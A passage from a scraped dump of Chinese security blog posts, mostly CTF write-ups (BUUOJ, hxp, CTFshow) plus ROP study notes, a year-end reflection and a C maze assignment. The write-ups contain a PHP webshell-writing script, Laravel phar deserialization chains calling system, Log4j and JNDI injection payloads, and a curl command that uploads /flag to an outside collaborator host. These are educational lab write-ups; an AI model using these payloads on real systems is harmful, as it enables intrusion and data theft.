=\u0026gt; $ext ]; } } 注意到这个后缀\n$filename = !empty($_POST[$this-\u0026gt;field]) ? $_POST[$this-\u0026gt;field] : $_FILES[$this-\u0026gt;field][\u0026#39;name\u0026#39;]; if(!in_array($filename[count($filename)-1], $this-\u0026gt;allow_ext)) { return $this-\u0026gt;error(\u0026#39;只允许上传图片文件\u0026#39;); } $ext = end($filename); $target_fullpath = $this-\u0026gt;dist_path . DIRECTORY_SEPARATOR . $new_name; 在判断的时候用的是count($filename)-1，变相提示我们可以有很多的name，配合数组进行绕过\n/upload/61ebe7df95da2.php?amiz=system(\u0026#39;cat /flag_9bc85242c9f1a7663e6806778e8a8558\u0026#39;); flag_9bc85242c9f1a7663e6806778e8a8558\n*ctf473831530_2018_web_virink_web | php-shell \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#39;orange\u0026#39; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); mkdir($sandbox); chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 20) { exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } echo \u0026#34;\u0026lt;br /\u0026gt; IP : {\\$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]}\u0026#34;; ?\u0026gt; 跟orange佬的[HitconCTF 2017]babyfirst-revenge一样，对cmd字符数更宽松了，这里采用师傅的脚本\nimport requests base_url = \u0026#39;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn\u0026#39; def exec_cmd2(c): # exec cmd my_params = { \u0026#39;cmd\u0026#39;: c } r = requests.get(base_url, params=my_params) print(\u0026#39;exec cmd2\u0026#39;, c, r) def write_webshell(): filename = [r\u0026#39;\u0026gt;echo\\ \\\\\u0026#39;, r\u0026#34;\u0026gt;\\\u0026#39;\\\u0026lt;\\?php \\\\\u0026#34;, r\u0026#39;\u0026gt;eval\\(\u0026#39;, r\u0026#39;\u0026gt;\\$_GET\\[c\\]\\)\u0026#39;, r\u0026#34;\u0026gt;\\;\\\u0026#39;\\\u0026gt;2.php\u0026#34;] for i in filename: my_params = { \u0026#39;cmd\u0026#39;: i } r = requests.get(base_url, params=my_params) print(i, r.status_code) cmd_list = [\u0026#39;ls -tr\u0026gt;1.sh\u0026#39;, \u0026#39;sh 1.sh\u0026#39;] for i in cmd_list: exec_cmd2(i) if __name__ == \u0026#39;__main__\u0026#39;: write_webshell() print(\u0026#39;ok\u0026#39;) 之后用/sandbox/xxxx/2.php?c=eval($_POST[\u0026lsquo;cmd\u0026rsquo;]);连接蚁剑，不过由于环境问题，后面内网的部分做不了了，寄\n参考：wp\npage 08 [HFCTF 2021 Final]tinypng | laravel反序列化 phar 是laravel框架，给了很详细的源码，但是主要的也就是这些\n给出的laravel框架的源码，版本是8.53.0，首先从/routes/web.php入手看一下路由\n一共两个路由，/即/index，实现的是文件上传的一些处理 比如后缀的过滤和文件名的设置之类的，/image则是特殊的，跟过去看ImageController类\n亮点在第25行，新建了一个imgcompress实例并执行compressImg()，跟过去看\n首先调用的_openImage()里第44行的getimagesize()结合phar会触发反序列化，此处的参数$this-\u0026gt;src来自于$source，也就是$request -\u0026gt; input('image');，也就是我们传入的image参数，可控\n反序列化的入口找到了，接下来就是找一找调用链，这里就直接放出来（我太菜了 寄\n可用链子1\n\u0026lt;?php namespace Symfony\\Component\\Routing\\Loader\\Configurator{ class ImportConfigurator{ private $parent; private $route; public function __construct($class){ $this-\u0026gt;parent=$class; $this-\u0026gt;route=\u0026#39;test\u0026#39;; } } } namespace Mockery{ class HigherOrderMessage{ private $mock; private $method; public function __construct($class){ $this-\u0026gt;mock=$class; $this-\u0026gt;method=\u0026#39;generate\u0026#39;; } } } namespace PHPUnit\\Framework\\MockObject{ final class MockTrait{ private $mockName; private $classCode; public function __construct(){ $this-\u0026gt;mockName=\u0026#39;123\u0026#39;; $this-\u0026gt;classCode=\u0026#39;phpinfo();\u0026#39;; } } } namespace{ use \\Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator; use \\Mockery\\HigherOrderMessage; use \\PHPUnit\\Framework\\MockObject\\MockTrait; $c=new MockTrait(); $b=new HigherOrderMessage($c); $a=new ImportConfigurator($b); @unlink(\u0026#34;phar.phar\u0026#34;); $phar=new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#34;__HALT_COMPILER();\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); } ?\u0026gt; 可用链子2\n\u0026lt;?php namespace Illuminate\\Broadcasting { class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-\u0026gt;events = $events; $this-\u0026gt;event = $event; } } class BroadcastEvent { public $connection; public function __construct($connection) { $this-\u0026gt;connection = $connection; } } } namespace Illuminate\\Bus { class Dispatcher { protected $queueResolver; public function __construct($queueResolver){ $this-\u0026gt;queueResolver = $queueResolver; } } } namespace { $c = new Illuminate\\Broadcasting\\BroadcastEvent(\u0026#39;ls\u0026#39;); $b = new Illuminate\\Bus\\Dispatcher(\u0026#39;system\u0026#39;); $a = new Illuminate\\Broadcasting\\PendingBroadcast($b, $c); #print(urlencode(serialize($a))); @unlink(\u0026#34;phar.phar\u0026#34;); $phar=new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#34;__HALT_COMPILER();\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); } 将生成的phar文件用gzip压缩后上传（记得要改一下content-type），在image处访问/image?image=phar://../storage/app/uploads/xxxxxxxxxx.png即可看到隐藏在500报错下面的phpinfo\n光看到phpinfo不是目标，还需要继续执行命令，这里用的是第二个链子 相当于执行以下的命令\nsystem(\u0026#34;cd ../../../;ls\u0026#34;); system(\u0026#34;cd ../../../;cat flag\u0026#34;); 参考：wp1 wp2\n————哄堂大孝了家人们 我是憨批 这个get传image的地方我一直在用post传 我还在纳闷为啥一直会报405的错😅😅😅\n[NPUCTF2020]EzShiro 和 [红明谷CTF 2021]JavaWeb 是完全一样的payload\n首先是一个/;/json绕过鉴权，之后是jndi注入，用那个jar一把梭\n[\u0026#34;ch.qos.logback.core.db.JNDIConnectionSource\u0026#34;,{\u0026#34;jndiLocation\u0026#34;:\u0026#34;rmi://101.35.114.107:1099/qhx0ip\u0026#34;}] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag\u0026#34; -A \u0026#34;101.35.114.107\u0026#34; ","date":"2022-01-19T03:16:47+08:00","permalink":"https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/","section":"posts","tags":["wp"],"title":"buuoj刷题记录-web"},{"categories":["LTS","pwn"],"contents":"ROP return oriented programming\n简单的汇编指令 ret -\u0026gt; pop EIP (ESP增大)\nleave -\u0026gt; move ESP, EBP; pop EBP\nintel AT\u0026amp;T mov eax, 8 movl $8, %eax mov ebx, 0ffffh movl $0xffff, %ebx int 80h int $80 mov eax, [ecx] movl (%ecx), %eax 几种防护措施 canary: 随机值防止栈溢出 (cookie) ASLR: 全局系统变量/proc/sys/kernel/randomize_va_space，内存地址随机化，而gdb调试中为关闭状态 PIE: 内存地址随机化 NX: 数据不可执行 ret2text 在代码段.text存在后门函数，将ret address修改为后门函数的地址控制函数的执行\npayload = cyclic(n) + p32(sys_addr) # n: ebp-eax+4(or 8), p32 or p64 ret2shellcode 存在rwx代码片段，传入shellcode并修改ret address为shellcode所在的缓冲区地址\nNX不开启时直接写入栈缓冲区，开启时向bss缓冲区或堆缓冲区写入shellcode并使用mprotect赋予可执行权限\nshellcode\nfrom pwn import * shellcraft.sh() shellcraft.amd64.sh()\t# before: context.arch = \u0026#39;amd64\u0026#39;! payload = asm(shellcraft.sh()) shellcode = b\u0026#39;\u0026#39; payload = shellcode.ljust(n, b\u0026#39;A\u0026#39;) + p32(sh_addr) ret2syscall 存在/bin/sh或sh字符串，构造gadgets多次跳转ret addr来执行execve系统调用；gadgets通过ROPgadget寻找\nROPgadget --binary filename_here --only \u0026#39;pop|ret\u0026#39; | grep \u0026#39;ebx\u0026#39; ROPgadget --binary filename_here --string \u0026#39;/bin/sh\u0026#39; ROPgadget --binary rop --only \u0026#39;int\u0026#39; 整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过int 0x80执行，amd64下为syscall；注意参数传入的顺序 (1-\u0026gt;N) 与栈中存放的顺序 (N-\u0026gt;1)的区别\npayload = flat(cyclic(n), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh_addr, int80_addr) # 0xb: execve的系统调用号 11, execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL) _Refer: System call\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ XMCVE 2020 CTF Pwn入门课程\nctfwiki - Stack Overflow\n蒸米ROP\n365-days-get-xuanwulab-job/weeks/week1.md\nC 语言函数调用栈 (一)\nC 语言函数调用栈 (二)\nC 语言函数调用栈 (二)\nSystem call\n","date":"2022-01-18T00:00:14+08:00","permalink":"https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/","section":"posts","tags":["pwn"],"title":"pwn rop入门-学习笔记"},{"categories":[],"contents":"写点什么呢？现在是2022年1月2日23点08分，本来应该在疯狂的肝数据结构的期末复习，但是我还是决定把本来计划在回家的飞机上写的年末总结写掉，了一桩心事。\n2021，对我而言是有挑战的一年。四月初正式开始学安全，断断续续的自己瞎琢磨，7月底加入V\u0026amp;N（见到了很多很多巨nb的师傅），暑假因为一些懂得都懂的原因摆了，开学之后的9月参加了一次hvv，10月参加强网杯青少赛拿了一等奖（感谢两位同队师傅带我）\n但是之后呢？我回顾了一下10月和之后的学习过程，发自内心的说我并不满意。说做了多少题吗？也没有，说学扎实了哪些知识点吗？也没有。那是玩什么游戏、享受生活了吗？也没有。奇怪的是博客一直都在发，wp也一直在写，那写的都是什么呢？随便提一些基本的技术细节还是做不到条理清晰地表达出来，打ctf还是一副相当拉垮的样子。\n过于丧气的话就不多说了，2021年还是收获颇丰的一年，开心的是学到了很多很多好玩有趣的web安全方面的技术，其次庆幸的是我自认为找到了上述困扰我的问题的一些原因。有时候我总是过于看重一段时间的学习成果而忽视了学习是一个长期积累的过程，学习不应该是某种“快消品”，而是一个长期乃至终身的事业，不应该把眼光局限于某一个阶段而把自己困进去。\n很多时候自己也会陷入无意义的内耗和自我纠结中，之后看到这句话：知之愈明，则行之愈笃；行之愈笃，则知之益明。 也就有点明白过来了。\n2022年希望能多打比赛，进线下，学更多更多更多的知识，在北京找一份实习工作（小目标），也希望能保持平稳的心态，多看书，每天留给自己思考放空的时间，不要被高速的生活所裹挟；希望每一天都过的充实丰富。\n好困好困，不多bb，4号到12号要考6门，希望我能活着回家。\n————想到了就补充一点：一般的年度总结都要给2022定学习计划，但是这里就不写了（主要是太菜了写出来丢人，溜了溜了）\n","date":"2022-01-02T20:08:38+08:00","permalink":"https://amiaaaz.github.io/life/2021-short-summary/","section":"life","tags":[],"title":"2021小结"},{"categories":[],"contents":"#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #define MAZESIZE 15 typedef struct ElemType{ int row; int col; int direction; } PosType; typedef struct { PosType pos; struct StackNode *next; } StackNode; typedef struct { StackNode *top; int stacksize; } LinkStack; char maze[MAZESIZE][MAZESIZE]; int FLAG = 1; void gotoxy(int x, int y); void InitMaze(); void DrawMaze(); bool InitStack(LinkStack **stack); bool isEmpty(LinkStack *stack); bool Push(LinkStack *stack, PosType e); bool Pop(LinkStack *stack, PosType *e); bool Pass(PosType curpos); bool Mark(PosType curpos); bool FindPath(PosType start, PosType end); PosType NextPos(PosType curpos); void gotoxy(int x,int y){ HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE); //GetStdHandle函数获取一个指向特定标准设备的句柄，包括标准输入，标准输出和标准错误; STD_OUTPUT_HANDLE正是代表标准输出（也就是显示屏）的宏 COORD pos; pos.X = x; pos.Y = y; SetConsoleCursorPosition(handle,pos); } void InitMaze(){ time_t t; srand((unsigned)time(\u0026amp;t)); system(\u0026#34;cls\u0026#34;); for (int i = 0; i \u0026lt;= MAZESIZE - 1; i++){ for (int j = 0; j \u0026lt;= MAZESIZE - 1;j++){ if (i==0 || j==0 || i==MAZESIZE-1 || j==MAZESIZE-1){ maze[i][j] = \u0026#39;#\u0026#39;; }else if((((rand()%13+1) == i) || ((rand()%13+1) == j)) \u0026amp;\u0026amp; !(i==1 \u0026amp;\u0026amp; j==1) \u0026amp;\u0026amp; !(i==MAZESIZE-2 \u0026amp;\u0026amp; j==MAZESIZE-2)){ maze[i][j] = \u0026#39;#\u0026#39;; }else{ maze[i][j] = \u0026#39; \u0026#39;; } } } printf(\u0026#34;[*] init the maze success!\u0026#34;); } void DrawMaze() { for (int i = 0;i \u0026lt; MAZESIZE;i++){ printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;\\t\u0026#34;); for (int j = 0;j \u0026lt; MAZESIZE;j++){ printf(\u0026#34;%c \u0026#34;, maze[i][j]); } } } bool InitStack(LinkStack **stack){ *stack = (LinkStack *)malloc(sizeof(LinkStack)); // 注意要给链栈分配内存 (*stack)-\u0026gt;top = NULL; // 链栈的空其实就是 top=NULL 的时候 (*stack)-\u0026gt;stacksize = 0; return true; } bool isEmpty(LinkStack *stack){ return stack-\u0026gt;stacksize == 0 ? true : false; } bool Push(LinkStack *stack, PosType e){ StackNode *s = (StackNode *)malloc(sizeof(StackNode)); s-\u0026gt;pos = e; s-\u0026gt;next = stack-\u0026gt;top; // 把当前的栈顶元素赋值给新结点的直接后继 stack-\u0026gt;top = s; // 将新的结点s赋值给栈顶指针 stack-\u0026gt;stacksize++; return true; } bool Pop(LinkStack *stack, PosType *e){ StackNode *p; if (isEmpty(stack)) return false; *e = stack-\u0026gt;top-\u0026gt;pos; p = stack-\u0026gt;top; // p用来存储要删除的栈顶结点 stack-\u0026gt;top = stack-\u0026gt;top-\u0026gt;next; // 使得栈顶指针下移一位，指向后一结点 free(p); // 释放结点p stack-\u0026gt;stacksize--; return true; } bool Pass(PosType curpos){ if(maze[curpos.row][curpos.col] == \u0026#39; \u0026#39;){ return true; } return false; } bool Mark(PosType curpos){ maze[curpos.row][curpos.col] = \u0026#39;@\u0026#39;; return true; } bool FindPath(PosType start, PosType end){ LinkStack *stack; int curstep = 1; PosType curpos; curpos = start; if (InitStack(\u0026amp;stack)) printf(\u0026#34;\\n[*] int the stack success!\\n\u0026#34;); printf(\u0026#34;[*] Start!\\n\u0026#34;, start.row, start.col); do{ if(Pass(curpos)){ Mark(curpos); curpos.direction = 1; Push(stack, curpos); gotoxy(0,0); DrawMaze(); Sleep(500); if(curpos.row == end.row \u0026amp;\u0026amp; curpos.col == end.col){ printf(\u0026#34;\\n\\n\\n\\n\\n\\n[*] reach the end: (%d, %d)\\n\u0026#34;, curpos.row, curpos.col); return true; } curpos = NextPos(curpos); curstep++; printf(\u0026#34;\\n\\n[+] step: %d\u0026#34;, curstep); printf(\u0026#34; -\u0026gt; (%d, %d)\u0026#34;, curpos.row, curpos.col); }else{ if(!isEmpty(stack)){ Pop(stack, \u0026amp;curpos); while(curpos.direction == 4 \u0026amp;\u0026amp; !isEmpty(stack)){ Mark(curpos); Pop(stack, \u0026amp;curpos); curstep--; gotoxy(0, 0); DrawMaze(); printf(\u0026#34;\\n\\n\\n[-] back to (%d, %d)\u0026#34;, curpos.row, curpos.col); } if(curpos.direction \u0026lt; 4){ curpos.direction++; Push(stack, curpos); curpos = NextPos(curpos); } } } } while (!isEmpty(stack)); printf(\u0026#34;\\n\\n[!] sorry, can\u0026#39;t find the path to end!\\n\u0026#34;); return false; } PosType NextPos(PosType curpos){ switch(curpos.direction){ case 1: curpos.col++; break; case 2: curpos.row++; break; case 3: curpos.col--; break; case 4: curpos.row--; break; } return curpos; } int main() { LinkStack *stack; PosType Start, End; char f; Start.row = 1; Start.col = 1; End.row = 13; End.col = 13; SetConsoleTitleA(\u0026#34;Let\u0026#39;s_Play_Mazes!\u0026#34;); system(\u0026#34;color 3E\u0026#34;); system(\u0026#34;mode con cols=45 lines=35\u0026#34;); do{ InitMaze(); DrawMaze(); FindPath(Start, End); printf(\u0026#34;\\n\\n\\n\\n\\n\\n\\n\\n[*] another game? (y or n)\\n\u0026#34;); f = getchar(); if(f==\u0026#39;n\u0026#39;) FLAG = 0; else if(f == \u0026#39;y\u0026#39;){ system(\u0026#34;cls\u0026#34;); } } while (FLAG); getchar(); return 0; } 使用vscode编写，运行结果\n冬天也过去了，该卷了\n（早该卷卷了！\n另外一些话说给自己：\n（当然不可能写出来的！baka！\n","date":"2021-12-30T13:09:58+08:00","permalink":"https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/","section":"posts","tags":[],"title":"数据结构作业——链栈\u0026迷宫求解"},{"categories":["CTF"],"contents":"https://ctf.show/challenges\nweb签到 一眼flask，简单fuzz一下发现过滤了字母 斜杠 引号 注释符 花括号 百分号 点号\n没过滤的还有括号和加减乘除\nA: 114)+(0 B: 1 C: -1 一行代码 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-11-18 21:25:22 # @Last Modified by: h1xa # @Last Modified time: 2021-11-18 22:14:12 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ echo !(!(include \u0026#34;flag.php\u0026#34;)||(!error_reporting(0))||stripos($_GET[\u0026#39;filename\u0026#39;],\u0026#39;.\u0026#39;)||($_GET[\u0026#39;id\u0026#39;]!=0)||(strlen($_GET[\u0026#39;content\u0026#39;])\u0026lt;=7)||(!eregi(\u0026#34;ctfsho\u0026#34;.substr($_GET[\u0026#39;content\u0026#39;],0,1),\u0026#34;ctfshow\u0026#34;))||substr($_GET[\u0026#39;content\u0026#39;],0,1)==\u0026#39;w\u0026#39;||(file_get_contents($_GET[\u0026#39;filename\u0026#39;],\u0026#39;r\u0026#39;) !== \u0026#34;welcome2ctfshow\u0026#34;))?$flag:str_repeat(highlight_file(__FILE__), 0); 现在都爱这种一行流了？\n整体是三目运算符，如果前面的表达式整体为真则返回$flag，而外面又套了!()，所以需要括号内部为假，而又都是||连接，所以需要每个小括号自己都为假，挨个看看\n$_GET['id']!=0 给id赋值为0或者直接留空\nstrlen($_GET['content'])\u0026lt;=7 content长于7\n!eregi(\u0026quot;ctfsho\u0026quot;.substr($_GET['content'],0,1),\u0026quot;ctfshow\u0026quot;) 没匹配为假，则匹配为真，content=wwwwwww\nsubstr($_GET['content'],0,1)=='w' 把content改个大写\nfile_get_contents($_GET['filename'],'r') !== \u0026quot;welcome2ctfshow\u0026quot; 用data://伪协议\npayload\n?id=0\u0026amp;content=Wwwwwwww\u0026amp;filename=data://text/plain,welcome2ctfshow 黑客网站 源码提示 flag不在这个服务器上，不用扫描，不用渗透\n看字符串末尾有onion，拼在一起\nhttp://tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion 访问就行了捏~\n***登陆不了 在验证码的地方有个参数，尝试文件包含\nhttp://bf986069-fc4e-42a3-b09b-c966f9e17a3c.challenge.ctf.show/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d 雀食有/etc/passwd，但是看不了/flag，看一下别的东西\n# /root/.bash_history /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5 好吧，竟然是java，先爬了\n","date":"2021-12-28T20:06:48+08:00","permalink":"https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/","section":"posts","tags":["wp"],"title":"CTFshow1221摆烂杯 Wp"},{"categories":["CTF"],"contents":"https://2021.ctf.link/internal/challenges\nLog 4 sanity check ALARM ALARM\nnc 65.108.176.77 1337\n看到log4j的第一反应是拿JNDI那个工具直接梭，但是发现弹不出来shell（不管是bash nc还是curl wget这些 尝试了发现都不行），但是显然需要一个rce或者是文件读取的点，再仔细看dockerfile发现flag已经被读到环境变量中了\n唔，所以直接读一下本地环境变量中的flag\n${jndi:ldap://127.0.0.1/${env:FLAG}} hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}\nunzipper Here, let me unzip that for you.\nhttp://65.108.176.76:8200/\nindex.php\n\u0026lt;?php session_start() or die(\u0026#39;session_start\u0026#39;); $_SESSION[\u0026#39;sandbox\u0026#39;] ??= bin2hex(random_bytes(16)); $sandbox = \u0026#39;data/\u0026#39; . $_SESSION[\u0026#39;sandbox\u0026#39;]; $lock = fopen($sandbox . \u0026#39;.lock\u0026#39;, \u0026#39;w\u0026#39;) or die(\u0026#39;fopen\u0026#39;); flock($lock, LOCK_EX | LOCK_NB) or die(\u0026#39;flock\u0026#39;); @mkdir($sandbox, 0700); chdir($sandbox) or die(\u0026#39;chdir\u0026#39;); if (isset($_FILES[\u0026#39;file\u0026#39;])) system(\u0026#39;ulimit -v 8192 \u0026amp;\u0026amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . \u0026#39; . escapeshellarg($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])); else if (isset($_GET[\u0026#39;file\u0026#39;])) if (0 === preg_match(\u0026#39;/(^$|flag)/i\u0026#39;, realpath($_GET[\u0026#39;file\u0026#39;]) ?: \u0026#39;\u0026#39;)) readfile($_GET[\u0026#39;file\u0026#39;]); fclose($lock); 看到zip想到肯定跟软链接读文件有关（但是这种姿势没有见过，学到了\n这里实现了两个功能，首先是unzip POST上传的zip文件，另一个是对GET的file参数进行文件读取，并且对参数进行了realpath()的处理，它会解析软链接的路径，并且有一个正则匹配要求不能有flag（大小写不敏感），之后可以通过readfile()读文件，参数是不经过滤的file\nreadfile有一个特性是接受url路径的参数，比如file:///flag.txt，会将其视作url去读取/flag.txt，而realpath会将其视作file:文件夹下的flag.txt文件\n我们可以制作一个指向file:文件夹中的xyz（任意文件）的名为flag.txt的软链接，它在realpath时被扩展为...../file:/xyz 可以通过if比较，而在readfile中则会按照url的方式进行解析（跟什么软链接就没关系了），读取根目录下的flag.txt\nmkdir file: cd file: touch amiz.txt ln -s amiz.txt flag.txt cd .. zip -ry tttttemp.zip file: hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}\n参考：wp\nshitty blog Please use my shitty blog 🤎!\nhttp://65.108.176.96:8888/\n\u0026lt;?php // TODO: fully implement multi-user / guest feature :( $secret = \u0026#39;SECRET_PLACEHOLDER\u0026#39;; $salt = \u0026#39;$6$\u0026#39;.substr(hash_hmac(\u0026#39;md5\u0026#39;, $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], $secret), 16).\u0026#39;$\u0026#39;; if(! isset($_COOKIE[\u0026#39;session\u0026#39;])){ $id = random_int(1, PHP_INT_MAX); $mac = substr(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $id, $secret, true), $salt), 20); } else { $session = explode(\u0026#39;|\u0026#39;, $_COOKIE[\u0026#39;session\u0026#39;]); if( ! hash_equals(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $session[0], $secret, true), $salt), $salt.$session[1])) { exit(); } $id = $session[0]; $mac = $session[1]; } setcookie(\u0026#39;session\u0026#39;, $id.\u0026#39;|\u0026#39;.$mac); $sandbox = \u0026#39;./data/\u0026#39;.md5($salt.\u0026#39;|\u0026#39;.$id.\u0026#39;|\u0026#39;.$mac); if(! is_dir($sandbox)) { mkdir($sandbox); } $db = new PDO(\u0026#39;sqlite:\u0026#39;.realpath($sandbox).\u0026#39;/blog.sqlite3\u0026#39;); $db-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); $db-\u0026gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $schema = \u0026#34; CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY, name VARCHAR(255)); CREATE TABLE IF NOT EXISTS entry (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT); INSERT OR IGNORE INTO user (id, name) VALUES (0, \u0026#39;System\u0026#39;); INSERT OR IGNORE INTO entry (id, user_id, content) VALUES (0, 0, \u0026#39;Welcome to your new blog - 🚩🚩🚩 ʕ•́ᴥ•̀ʔっ🤎 🚩🚩🚩\u0026#39;); \u0026#34;; $db-\u0026gt;exec($schema); function get_entries($db){ $sth = $db-\u0026gt;query(\u0026#39;SELECT id, user_id, content FROM entry ORDER BY id DESC\u0026#39;); return $sth-\u0026gt;fetchAll(); } function get_user($db, $user_id) : string { foreach($db-\u0026gt;query(\u0026#34;SELECT name FROM user WHERE id = {$user_id}\u0026#34;) as $user) { return $user[\u0026#39;name\u0026#39;]; } return \u0026#39;me\u0026#39;; } function insert_entry($db, $content, $user_id) { $sth = $db-\u0026gt;prepare(\u0026#39;INSERT INTO entry (content, user_id) VALUES (?, ?)\u0026#39;); $sth-\u0026gt;execute([$content, $user_id]); } function delete_entry($db, $entry_id, $user_id) { $db-\u0026gt;exec(\u0026#34;DELETE from entry WHERE {$user_id} \u0026lt;\u0026gt; 0 AND id = {$entry_id}\u0026#34;); } if(isset($_POST[\u0026#39;content\u0026#39;])) { insert_entry($db, htmlspecialchars($_POST[\u0026#39;content\u0026#39;]), $id); header(\u0026#39;Location: /\u0026#39;); exit; } $entries = get_entries($db); if(isset($_POST[\u0026#39;delete\u0026#39;])) { foreach($entries as $key =\u0026gt; $entry) { if($_POST[\u0026#39;delete\u0026#39;] === $entry[\u0026#39;id\u0026#39;]){ delete_entry($db, $entry[\u0026#39;id\u0026#39;], $entry[\u0026#39;user_id\u0026#39;]); break; } } header(\u0026#39;Location: /\u0026#39;); exit; } foreach($entries as $key =\u0026gt; $entry) { $entries[$key][\u0026#39;user\u0026#39;] = get_user($db, $entry[\u0026#39;user_id\u0026#39;]); } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;My shitty Blog\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/favicon.png\u0026#34;/\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;My shitty blog\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;textarea cols=\u0026#34;50\u0026#34; rows=\u0026#34;10\u0026#34; name=\u0026#34;content\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Post\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php foreach($entries as $entry):?\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?= $entry[\u0026#39;content\u0026#39;] ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;small\u0026gt;By \u0026lt;?= $entry[\u0026#39;user\u0026#39;] ?\u0026gt; \u0026lt;/small\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;delete\u0026#34; value=\u0026#34;\u0026lt;?= $entry[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Delete\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php endforeach ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 使用sqlite做数据库，非模拟预处理，另外很坑爹的把每一次的请求的设置了header('Location: /');导致没有回显（导致虽然它开启了报错的选项 但是把常规的报错注入给毙掉了）\n首先从几个数据库函数中找是否有可以注入的点，get_entries无输入值用不了，insert_entry用了prepare预处理\n剩下的get_user和delete_entry有明显的sql语句拼接（无过滤），尝试利用delete_entry的$user_id进行sql注入，而dockerfile中设置了flag.txt的权限，我们只能rce来执行/readflag，所以注入不是注数据而是应该注一个类似\u0026lt;?php echo system('/readflag');?\u0026gt;这样的shell进去（具体操作在后面\n而这里的$user_id我们可以通过post再delete来通过session中的$id来控制，返回代码中康康session部分的内容\n是沙箱式的sqlite数据库，鉴权部分使用cookie+复杂的一堆加盐哈希函数\n为了通过\nhash_equals(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $session[0], $secret, true), $salt), $salt.$session[1]) 的if校验，我们需要伪造一个合理的session值 类似$id.'|'.$mac这样\n$id = random_int(1, PHP_INT_MAX); $mac = substr(crypt(hash_hmac(\u0026#39;md5\u0026#39;, $id, $secret, true), $salt), 20); 